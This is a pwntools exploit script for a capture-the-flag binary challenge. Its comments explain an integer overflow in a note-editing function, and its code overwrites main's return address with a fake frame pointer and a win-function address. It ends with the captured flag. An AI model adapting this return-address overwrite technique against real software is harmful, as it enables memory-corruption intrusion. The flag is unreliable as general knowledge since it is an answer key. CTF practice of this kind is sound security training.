from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall', '''
    b *(append+0x4d)
    b *(edit+0x113)
    b *(main+0xfb)
    continue
''')

# p = remote("oldshire-of-preposterous-harmony.gpn23.ctf.kitctf.de", "443", ssl=True)

def append_note(note):
    p.sendlineafter(b"6. Quit\n", b'3')
    p.sendlineafter(b"bytes left):\n", note)

def edit_note(offset, size, note):
    p.sendlineafter(b"6. Quit\n", b'4')
    p.sendlineafter(b"start editing: ", str(offset).encode())
    p.sendlineafter(b"overwrite: ", str(size).encode())
    p.sendline(note)

def quit():
    p.sendlineafter(b"6. Quit\n", b'6')

# 1. all used fgets function in this challenge is self-written, n-2 bytes can be read at most with a size of n as second argument
# 2. there is a integer overflow vulnerability in edit function (overwrite bytes count is int64_t and note->pos is uint32_t), which can be used to overwrite return address in main function
# 3. following instructions in edit function requires that within edit function, QWORD PTR [QWORD PTR [rbp-0x48]] has to be a valid address, which is used as first argument of strcspn function
# 0x40149d <edit+0118>      mov    rax, QWORD PTR [rbp-0x48]
# 0x4014a1 <edit+011c>      mov    rax, QWORD PTR [rax]
# 0x4014a4 <edit+011f>      mov    edx, DWORD PTR [rbp-0xc]
# 0x4014a7 <edit+0122>      mov    edx, edx
# 0x4014a9 <edit+0124>      add    rax, rdx
# 0x4014ac <edit+0127>      mov    esi, 0x402040
# 0x4014b1 <edit+012c>      mov    rdi, rax
# 0x4014b4 <edit+012f>      call   0x401060 <strcspn@plt>

FAKE_RBP = 0x404800
WIN_ADDR = 0x401221
append_note(b'A'*(0x400-2))
edit_note(0x0, -0xffffffff+0x430-1, b'B'*0x400+p64(FAKE_RBP)+b'C'*0x20+p64(WIN_ADDR))
quit()

p.interactive()

# GPNCTF{noW_Y0u_SuR3Ly_4re_READY_T0_PwN_laDy8IRd!}